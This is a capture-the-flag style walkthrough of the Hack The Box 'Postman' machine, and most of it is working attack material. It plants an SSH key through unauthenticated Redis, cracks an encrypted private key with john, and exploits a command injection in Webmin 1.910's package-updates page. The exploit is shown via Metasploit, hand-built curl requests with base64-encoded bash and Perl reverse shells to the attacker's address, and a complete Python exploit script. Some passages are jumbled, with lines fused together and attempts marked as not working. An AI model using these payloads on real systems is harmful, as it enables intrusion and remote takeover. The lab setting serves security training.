# Postman

Tags

* redis
* burpsuite
* john
* metasploit
* webmin vulnerability
* [IppSec](https://www.youtube.com/watch?v=jJnHET1o8ZQ) (video)

Scan ports

```bash
make do-access
docker exec -it htb-lab bash

# machine ip
ping 10.10.10.160

# output folder
mkdir -p /share/postman

# -n: Never do DNS resolution
# -Pn: Treat all hosts as online (skip host discovery)
# -sC: equivalent to --script=default
# -sV: Probe open ports to determine service/version info
# -p-: All ports
# --min-rate <number>: Send packets no slower than <number> per second
# -oA <basename>: Output in the three major formats at once
# -v: Increase verbosity level
nmap -n -Pn -sC -sV -p- --min-rate 1000 -oA /share/postman/nmap -v 10.10.10.160
```

Nmap output

```
PORT      STATE SERVICE VERSION
22/tcp    open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 46:83:4f:f1:38:61:c0:1c:74:cb:b5:d1:4a:68:4d:77 (RSA)
|   256 2d:8d:27:d2:df:15:1a:31:53:05:fb:ff:f0:62:26:89 (ECDSA)
|_  256 ca:7c:82:aa:5a:d3:72:ca:8b:8a:38:3a:80:41:a0:45 (ED25519)
80/tcp    open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-favicon: Unknown favicon MD5: E234E3E8040EFB1ACD7028330A956EBF
| http-methods: 
|_  Supported Methods: POST OPTIONS HEAD GET
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: The Cyber Geek's Personal Website
6379/tcp  open  redis   Redis key-value store 4.0.9
10000/tcp open  http    MiniServ 1.910 (Webmin httpd)
|_http-favicon: Unknown favicon MD5: 91549383E709F4F1DD6C8DAB07890301
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Site doesn't have a title (text/html; Charset=iso-8859-1).
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Probe open ports

```bash
ssh root@10.10.10.160
http 10.10.10.160:80
echo "PING" | nc 10.10.10.160 6379
http --verify=no https://10.10.10.160:10000
```

* [Unauthorized SSH access](https://book.hacktricks.xyz/pentesting/6379-pentesting-redis#ssh)

```bash
mkdir -p /share/postman/keys

# generate key pair
ssh-keygen -N "" -f /share/postman/keys/postman

# important append \n\n before and after the pub key
(echo -e "\n\n"; cat /share/postman/keys/postman.pub; echo -e "\n\n") > /share/postman/keys/postman.txt

# create fake redis key/value (without `save` it's lost)
apk add redis
cat /share/postman/keys/postman.txt | redis-cli -h 10.10.10.160 -x set ssh-postman

# continue the commands and save
nc -v 10.10.10.160 6379
# verify key content - without \n\n the content is corrupted
get ssh-postman
# create backup directory
config set dir /var/lib/redis/.ssh
# create backup db
config set dbfilename authorized_keys
# save and exit
save

# private key permissions
chmod 600 /share/postman/keys/postman
# access to instance "redis@Postman"
ssh -i /share/postman/keys/postman redis@10.10.10.160
```

Upload privesc scripts from lab

```bash
# save <LAB_IP_ADDRESS> from tun0
ifconfig

mkdir -p /share/postman/www

# expose single file
cp /opt/privilege-escalation-awesome-scripts-suite/linPEAS/linpeas.sh /share/postman/www
cp /opt/LinEnum/LinEnum.sh /share/postman/www

# run static server
python -m http.server -d /share/postman/www

# download scripts
ssh -i /share/postman/keys/postman redis@10.10.10.160
cd /dev/shm
# <LAB_IP_ADDRESS>
wget 10.10.14.14:8000/linpeas.sh
bash linpeas.sh
wget 10.10.14.14:8000/LinEnum.sh
bash LinEnum.sh
```

Output of privesc scripts

```
[-] Location and Permissions (if accessible) of .bak file(s):
-rwxr-xr-x 1 Matt Matt 1743 Aug 26  2019 /opt/id_rsa.bak
```

Brute force encrypted key passphrase

```bash
# copy from redis@Postman
cat /opt/id_rsa.bak 
#-----BEGIN RSA PRIVATE KEY-----
#Proc-Type: 4,ENCRYPTED
#DEK-Info: DES-EDE3-CBC,73E9CEFBCCF5287C

# copy to root@lab
mkdir -p /share/postman/john
vim /share/postman/john/postman.ssh

# convert to compatible format
ssh2john.py /share/postman/john/postman.ssh > /share/postman/john/postman.ssh.john

# PWD: computer2008
john /share/postman/john/postman.ssh.john --wordlist=/usr/share/wordlists/rockyou.txt
# user access
su - Matt
```

Metasploit

```bash
docker exec -it htb-metasploit bash
openvpn /share/*.ovpn

# search exploits
# Webmin version: 1.910
searchsploit webmin -j

# start console
msfconsole

# search exploits
search webmin

# select exploit
info exploit/linux/http/webmin_packageup_rce
use exploit/linux/http/webmin_packageup_rce

# list parameters
show options

set RHOSTS 10.10.10.160
set LHOST tun0
set USERNAME Matt
set PASSWORD computer2008
set SSL true
exploit
```

Intercept requests with Burp

* public port `4444:4444` metasploit + openvpn
* public port `8080:8081` burpsuite + openvpn

```bash
make do-htb-tunnel

# start burp suite
vncviewer localhost:5900
openvpn /share/*.ovpn
install_firefox_foxy_proxy
burpsuite
# save <BURP_SUITE_IP_ADDRESS> eth0
ifconfig

# config metasploit
vi /etc/hosts
#<BURP_SUITE_IP_ADDRESS> burpsuite
ping burpsuite

# setup proxy on port 8081
set Proxies http:burpsuite:8081
set ReverseAllowProxy true
exploit
# >>> expect intercept
```

Inspect request

```
# headers
POST /package-updates/update.cgi HTTP/1.1
Host: 10.10.10.160:10000
Cookie: sid=fa9158d7af820394e523a31a9bfa95bc

# request
u=acl%2Fapt&u=%20%7C%20bash%20-c%20%22%7becho%2ccGVybCAtTUlPIC1lICckcD1mb3JrO2V4aXQsaWYoJHApO2ZvcmVhY2ggbXkgJGtleShrZXlzICVFTlYpe2lmKCRFTlZ7JGtleX09fi8oLiopLyl7JEVOVnska2V5fT0kMTt9fSRjPW5ldyBJTzo6U29ja2V0OjpJTkVUKFBlZXJBZGRyLCIxMC4xMC4xNC4xNDo0NDQ0Iik7U1RESU4tPmZkb3BlbigkYyxyKTskfi0%2bZmRvcGVuKCRjLHcpO3doaWxlKDw%2bKXtpZigkXz1%2bIC8oLiopLyl7c3lzdGVtICQxO319Oyc%3d%7d%7c%7bbase64%2c-d%7d%7c%7bbash%2c-i%7d%22&ok_top=Update+Selected+Packages

# decoded request
u=acl/apt&u= | bash -c "{echo,cGVybCAtTUlPIC1lICckcD1mb3JrO2V4aXQsaWYoJHApO2ZvcmVhY2ggbXkgJGtleShrZXlzICVFTlYpe2lmKCRFTlZ7JGtleX09fi8oLiopLyl7JEVOVnska2V5fT0kMTt9fSRjPW5ldyBJTzo6U29ja2V0OjpJTkVUKFBlZXJBZGRyLCIxMC4xMC4xNC4xNDo0NDQ0Iik7U1RESU4tPmZkb3BlbigkYyxyKTskfi0+ZmRvcGVuKCRjLHcpO3doaWxlKDw+KXtpZigkXz1+IC8oLiopLyl7c3lzdGVtICQxO319Oyc=}|{base64,-d}|{bash,-i}"&ok_top=Update+Selected+Packages

# payload
echo "cGVybCAtTUlPIC1lICckcD1mb3JrO2V4aXQsaWYoJHApO2ZvcmVhY2ggbXkgJGtleShrZXlzICVFTlYpe2lmKCRFTlZ7JGtleX09fi8oLiopLyl7JEVOVnska2V5fT0kMTt9fSRjPW5ldyBJTzo6U29ja2V0OjpJTkVUKFBlZXJBZGRyLCIxMC4xMC4xNC4xNDo0NDQ0Iik7U1RESU4tPmZkb3BlbigkYyxyKTskfi0+ZmRvcGVuKCRjLHcpO3doaWxlKDw+KXtpZigkXz1+IC8oLiopLyl7c3lzdGVtICQxO319Oyc=" | base64 -d

# decoded payload
perl -MIO -e '$p=fork;exit,if($p);foreach my $key(keys %ENV){if($ENV{$key}=~/(.*)/){$ENV{$key}=$1;}}$c=new IO::Socket::INET(PeerAddr,"10.10.14.14:4444");STDIN->fdopen($c,r);$~->fdopen($c,w);while(<>){if($_=~ /(.*)/){system $1;}};'
```

Setup Burp

```bash
# download certificate
http://localhost:8080

# Preferences > Privacy & Security > Certificates > View Certificates > Import
# select "cacert.der" and "Trust this CA"

# add proxy in FoxyProxy
# burp | 127.0.0.1 | 8080

# verify intercept
# Matt (username) | computer2008 (password)
https://10.10.10.160:10000
```

Manual payload

* public port `4242:4242` lab + openvpn

```bash
# ISSUE with httpie, prefer curl
# https://github.com/httpie/httpie/issues/534
# -n: do not print trailing newline
# --form adds also the charset by default which is causing the request to fail and needs to be explicitly removed
# Content-Type: application/x-www-form-urlencoded; charset=utf-8
echo -n "user=Matt&pass=computer2008" | \
  http -v --verify=no --form https://10.10.10.160:10000/session_login.cgi \
  'Content-Type:application/x-www-form-urlencoded' \
  'Cookie:testing=1'

# -i: prints only headers
# -k: trust certificate
# -b: cookie
# get SID
curl -i -k -b 'testing=1' \
  --data-binary 'user=Matt&pass=computer2008' \
  https://10.10.10.160:10000/session_login.cgi

# exploit
curl -i -k -X POST \
  -H 'Referer: https://10.10.10.160:10000/package-updates/?xnavigation=1' \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  -b 'sid=<SID>' \
  --data-binary '<PAYLOAD>' \
  https://10.10.10.160:10000/package-updates/update.cgi

# https://unix.stackexchange.com/questions/159253/decoding-url-encoding-percent-encoding
urldecode 'u=acl%2Fapt&u=%20%7C%20bash%20-c%20%22%7becho%2ccGVybCAtTUlPIC1lICckcD1mb3JrO2V4aXQsaWYoJHApO2ZvcmVhY2ggbXkgJGtleShrZXlzICVFTlYpe2lmKCRFTlZ7JGtleX09fi8oLiopLyl7JEVOVnska2V5fT0kMTt9fSRjPW5ldyBJTzo6U29ja2V0OjpJTkVUKFBlZXJBZGRyLCIxMC4xMC4xNC4xNTo0NDQ0Iik7U1RESU4tPmZkb3BlbigkYyxyKTskfi0%2bZmRvcGVuKCRjLHcpO3doaWxlKDw%2bKXtpZigkXz1%2bIC8oLiopLyl7c3lzdGVtICQxO319Oyc%3d%7d%7c%7bbase64%2c-d%7d%7c%7bbash%2c-i%7d%22&ok_top=Update+Selected+Packages'
# output
u=acl/apt&u= | bash -c "{echo,<ENCODED_PAYLOAD>}|{base64,-d}|{bash,-i}"&ok_top=Update Selected Packages
# this is how the payload should be built
u=acl/apt&u= | bash -c "{echo,-n,<ENCODED_PAYLOAD>,}|{,base64,-d}|{bash,-i}"&ok_top=Update Selected Packages

# test locally: verify bash expansion without spaces - it can't contain pipes
bash -c "{ping,-c,1,127.0.0.1}"
# verify intercept packets
tcpdump -i lo -n icmp

docker exec -it htb-lab bash
# e.g. tun0 10.10.14.15
ifconfig
# verify intercept packets
tcpdump -i tun0 -n icmp
ping 10.10.10.160
bash -c "{ping,-c,1,10.10.14.15}"

# NOT WORKING
urlencode 'u=acl/apt&u= | bash -c "{ping,-c,1,10.10.14.15}"&ok_top=Update Selected Packages'
# output
u%3Dacl%2Fapt%26u%3D+%7C+bash+-c+%22%7Bping%2C-c%2C1%2C10.10.14.15%7D%22%26ok_top%3DUpdate+Selected+Packages

# NOT WORKING - ICMP issue?
# sample
echo -n 'ping -c 1 10.10.14.15' | base64
# equivalent
{echo,-n,cGluZyAtYyAxIDEwLjEwLjE0LjE1,}|{,base64,-d}|{bash,-i}
# payload
u=acl/apt&u= | bash -c "{echo,-n,cGluZyAtYyAxIDEwLjEwLjE0LjE1,}|{,base64,-d}|{bash,-i}"&ok_top=Update Selected Packages
# urlencoded
u%3Dacl%2Fapt%26u%3D+%7C+bash+-c+%22%7Becho%2C-n%2CcGluZyAtYyAxIDEwLjEwLjE0LjE1%2C%7D%7C%7B%2Cbase64%2C-d%7D%7C%7Bbash%2C-i%7D%22%26ok_top%3DUpdate+Selected+Packages

curl -i -s -k -X POST \
  -H 'Referer: https://10.10.10.160:10000/package-updates/?xnavigation=1' \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  -b 'sid=792e4eef5a988488627d8e7b5c20d5ac' \
  --data-binary 'u%3Dacl%2Fapt%26u%3D+%7C+bash+-c+%22%7Becho%2C-n%2CcGluZyAtYyAxIDEwLjEwLjE0LjE1%2C%7D%7C%7B%2Cbase64%2C-d%7D%7C%7Bbash%2C-i%7D%22%26ok_top%3DUpdate+Selected+Packages' \
  https://10.10.10.160:10000/package-updates/update.cgi

# http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet

# reverse shell
# bash -i >& /dev/tcp/10.0.0.1/8080 0>&1
# e.g. tun0 10.10.14.15
bash -i >& /dev/tcp/10.10.14.15/4242 0>&1
# test
nc -lvnp 4242

# replace spaces with commas inside bash command (no reason)
# same encoding ???
echo -n 'bash,-i,>&,/dev/tcp/10.10.14.15/4242,0>&1' | base64
echo -n 'bash -i >& /dev/tcp/10.10.14.15/4242 0>&1' | base64
# output
YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC4xNS80MjQyIDA+JjE=
# test decoding
echo -n 'YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC4xNS80MjQyIDA+JjE=' | base64 -d
# equivalent (no spaces, no pipes)
# replace spaces with commas
{echo,-n,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC4xNS80MjQyIDA+JjE=,}|{,base64,-d}

# test
{echo,-n,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC4xNS80MjQyIDA+JjE=,}|{,base64,-d}|{bash,-i}
nc -lvnp 4242

u=acl/apt&u= | bash -c "{echo,-n,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC4xNS80MjQyIDA+JjE=,}|{,base64,-d}|{bash,-i}"&ok_top=Update Selected Packages
# output urcurl -i -k -X POST \
  -H 'Referer: https://10.10.10.160:10000/package-updates/?xnavigation=1' \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  -b 'sid=fb9f0fecee9ab8bb758871783abbd460' \
  --data-binary 'u%3Dacl%2Fapt%26u%3D+%7C+bash+-c+%22%7Becho%2C-n%2CYmFzaCAtaSA%2BJiAvZGV2L3RjcC8xMC4xMC4xNC4xNS80MjQyIDA%2BJjE%3D%2C%7D%7C%7B%2Cbase64%2C-d%7D%7C%7Bbash%2C-i%7D%22%26ok_top%3DUpdate+Selected+Packages' \
  https://10.10.10.160:10000/package-updates/update.cgilencode
u%3Dacl%2Fapt%26u%3D+%7C+bash+-c+%22%7Becho%2C-n%2CYmFzaCAtaSA%2BJiAvZGV2L3RjcC8xMC4xMC4xNC4xNS80MjQyIDA%2BJjE%3D%2C%7D%7C%7B%2Cbase64%2C-d%7D%7C%7Bbash%2C-i%7D%22%26ok_top%3DUpdate+Selected+Packages

# plus
u=acl/apt&u=+|+bash+-c+"{echo,-n,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC4xNS80MjQyIDA+JjE=,}|{,base64,-d}|{bash,-i}"&ok_top=Update Selected Packages
u%3Dacl%2Fapt%26u%3D+%7C+bash+-c+%22%7Becho%2C-n%2CYmFzaCAtaSA%2BJiAvZGV2L3RjcC8xMC4xMC4xNC4xNS80MjQyIDA%2BJjE%3D%2C%7D%7C%7B%2Cbase64%2C-d%7D%7C%7Bbash%2C-i%7D%22%26ok_top%3DUpdate+Selected+Packages

curl -i -L -k -X POST \
  -H 'Referer: https://10.10.10.160:10000/package-updates/?xnavigation=1' \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  -b 'sid=3e6d1f2635ddbb7306f15d8ec0afb4ba' \
  --data-binary 'u%3Dacl%2Fapt%26u%3D+%7C+bash+-c+%22%7Becho%2C-n%2CYmFzaCAtaSA%2BJiAvZGV2L3RjcC8xMC4xMC4xNC4xNS80MjQyIDA%2BJjE%3D%2C%7D%7C%7B%2Cbase64%2C-d%7D%7C%7Bbash%2C-i%7D%22%26ok_top%3DUpdate+Selected+Packages' \
  https://10.10.10.160:10000/package-updates/update.cgi

nc -lvnp 4242
---

# >>> root

# metasploit 4444
echo -n 'bash -i >& /dev/tcp/10.10.14.8/4444 0>&1' | base64
# outputu=acl/apt&u= | bash -c "{echo,-n,<ENCODED_PAYLOAD>,}|{,base64,-d}|{bash,-i}"&ok_top=Update Selected Packages
YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC44LzQ0NDQgMD4mMQ==
# test
echo -n 'YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC44LzQ0NDQgMD4mMQ==' | base64 -d
# test
{echo,-n,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC44LzQ0NDQgMD4mMQ==,}|{,base64,-d}

# template
u=acl/apt&u= | bash -c "{echo,-n,<ENCODED_PAYLOAD>,}|{,base64,-d}|{bash,-i}"&ok_top=Update Selected Packages

urlencode 'u=acl/apt&u= | bash -c "{echo,-n,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC44LzQ0NDQgMD4mMQ==,}|{,base64,-d}|{bash,-i}"&ok_top=Update Selected Packages'
# output
u%3Dacl%2Fapt%26u%3D+%7C+bash+-c+%22%7Becho%2C-n%2CYmFzaCAtaSA%2BJiAvZGV2L3RjcC8xMC4xMC4xNC44LzQ0NDQgMD4mMQ%3D%3D%2C%7D%7C%7B%2Cbase64%2C-d%7D%7C%7Bbash%2C-i%7D%22%26ok_top%3DUpdate+Selected+Packages
# test
urldecode 'u%3Dacl%2Fapt%26u%3D+%7C+bash+-c+%22%7Becho%2C-n%2CYmFzaCAtaSA%2BJiAvZGV2L3RjcC8xMC4xMC4xNC44LzQ0NDQgMD4mMQ%3D%3D%2C%7D%7C%7B%2Cbase64%2C-d%7D%7C%7Bbash%2C-i%7D%22%26ok_top%3DUpdate+Selected+Packages'

# ^^^ NOT WORKING - URL encoding issue

# get SID
curl -i -k -b 'testing=1' \
  --data-binary 'user=Matt&pass=computer2008' \
  https://10.10.10.160:10000/session_login.cgi

#>>> urlencode currupt the exploit
# replace space with +
# replace / with %2F
# replace + in base64 with %2B
# replace = in base64 with %3D

# exploit
curl -i -k -X POST \
  -H 'Referer: https://10.10.10.160:10000/package-updates/?xnavigation=1' \
  -b 'sid=36dfa33151b241b381a49f13d4863bbc' \
  --data-binary 'u=acl%2Fapt&u=+|+bash+-c+"{echo,-n,YmFzaCAtaSA%2BJiAvZGV2L3RjcC8xMC4xMC4xNC44LzQ0NDQgMD4mMQ%3D%3D,}|{,base64,-d}|{bash,-i}"&ok_top=Update Selected Packages' \
  https://10.10.10.160:10000/package-updates/update.cgi

nc -lvnp 4444

root@Postman:/usr/share/webmin/package-updates/# cat /root/root.txt
cat /root/root.txt
```

***

POST /session\_login.cgi HTTP/1.1 Host: 10.10.10.160:10000 User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1) Cookie: testing=1 Content-Type: application/x-www-form-urlencoded Content-Length: 33 Connection: close

page=\&user=Matt\&pass=computer2008

***

POST /proc/index\_tree.cgi HTTP/1.1 Host: 10.10.10.160:10000 User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1) Cookie: sid=b4906df6cbd67571d11e57d3ee9671a9 Referer: https://10.10.10.160:10000/sysinfo.cgi?xnavigation=1 Content-Type: application/x-www-form-urlencoded Content-Length: 0 Connection: close

***

POST /package-updates/update.cgi HTTP/1.1 Host: 10.10.10.160:10000 User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1) Cookie: sid=b4906df6cbd67571d11e57d3ee9671a9 Referer: https://10.10.10.160:10000/package-updates/?xnavigation=1 Content-Type: application/x-www-form-urlencoded Content-Length: 440 Connection: close

u=acl%2Fapt\&u=%20%7C%20bash%20-c%20%22%7becho%2ccGVybCAtTUlPIC1lICckcD1mb3JrO2V4aXQsaWYoJHApO2ZvcmVhY2ggbXkgJGtleShrZXlzICVFTlYpe2lmKCRFTlZ7JGtleX09fi8oLiopLyl7JEVOVnska2V5fT0kMTt9fSRjPW5ldyBJTzo6U29ja2V0OjpJTkVUKFBlZXJBZGRyLCIxMC4xMC4xNC4xNTo0NDQ0Iik7U1RESU4tPmZkb3BlbigkYyxyKTskfi0%2bZmRvcGVuKCRjLHcpO3doaWxlKDw%2bKXtpZigkXz1%2bIC8oLiopLyl7c3lzdGVtICQxO319Oyc%3d%7d%7c%7bbase64%2c-d%7d%7c%7bbash%2c-i%7d%22\&ok\_top=Update+Selected+Packages

***

https://lillox.info/postman-machine.html

```
pip install requests
python exploit.py
```

```python
#!/usr/bin/env python3

import requests
import urllib3
urllib3.disable_warnings()
import base64

url="https://10.10.10.160:10000/"
username="Matt"
password="computer2008"

# Retrieve a valid session ID
request={'user':username, 'pass':password}
result=requests.post(url + "session_login.cgi", data=request, cookies={"testing": "1"}, verify=False, allow_redirects=False)
if "sid" in result.headers['Set-Cookie']:
    sid = result.headers['Set-Cookie'].replace('\n', '').split('=')[1].split(";")[0].strip()
    print("Found a valid SID: {}".format(sid))
else:
    print("Something gone wrong...exiting")
    exit(1)
# Payload
cmd= "bash -i >& /dev/tcp/10.10.14.8/4444 0>&1"
cmd_base64=base64.b64encode(bytes(cmd, 'utf-8')).decode("utf-8")
payload=' | bash -c "{echo,'+cmd_base64+'}|{base64,-d}|{bash,-i}"'
print(payload)
# Build the request
request={'u':['acl/apt', payload]}
headers= {'Connection': 'close','referer': url+"package-updates/?xnavigation=1"}
try:
  requests.post(url+"package-updates/update.cgi",data=request, cookies={"sid":sid}, verify=False, allow_redirects=False, headers=headers, timeout=10)
#except requests.exceptions.HTTPError as e:
#    print (e.response.text)
except:
    print("Something gone wrong...exiting")
    exit(1)
print("Check the nc listener")
```
